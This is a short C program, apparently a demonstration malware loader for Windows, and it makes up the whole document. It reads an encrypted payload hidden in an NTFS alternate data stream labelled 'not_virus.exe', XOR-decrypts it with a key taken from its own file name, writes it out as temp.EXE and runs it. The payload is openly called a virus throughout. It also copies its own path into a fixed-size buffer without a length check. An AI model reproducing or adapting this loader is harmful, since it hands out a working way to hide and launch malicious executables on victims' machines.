#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAXLINE 1024

int main(int argc, char ** argv)
{
  char me[MAXLINE],virus[MAXLINE],command[MAXLINE],key[MAXLINE],*pch;
  unsigned char c;
  FILE *e_virus, *d_virus;
  int length_me, i = 0;
  length_me = strlen(argv[0]);
  strncpy(me,argv[0], length_me+1);
  pch = strtok(me,"/\\");
  while(pch != NULL)
  {
    strcpy(key,pch);
    pch = strtok(NULL, "/\\");
  }
  strcpy(virus,key);
  strcat(virus,":not_virus.exe");
  printf("Decrypt Key: %s\tVirus: %s\n",key,virus);
  system("pause");

  e_virus = fopen(virus,"rb");
  if(e_virus == NULL)
  {
    printf("Cannot open encrypted file %s.\n", virus);
    system("pause");
    return -1;
  }
  fseek(e_virus,0L, SEEK_END);
  int size = ftell(e_virus);
  fseek(e_virus,0L, SEEK_SET);
  
  d_virus = fopen("temp.EXE","wb");

  //Decrypt each character
  for(i=0;i<size;i++)
  {
    c = fgetc(e_virus);
    c = c ^ key[i%strlen(key)];
    fwrite(&c,1,sizeof(c),d_virus);
  }

  // Close files
  fclose(e_virus);
  fclose(d_virus);
  printf("Virus decrypted.\n");
  system("pause");
  
  // Start the decrypted virus
  strcpy(command, "start ./temp.EXE ");
  strcat(command, key);
  printf("command: %s\n",command);
  system(command);
  
  system("pause");
  return 1;
}
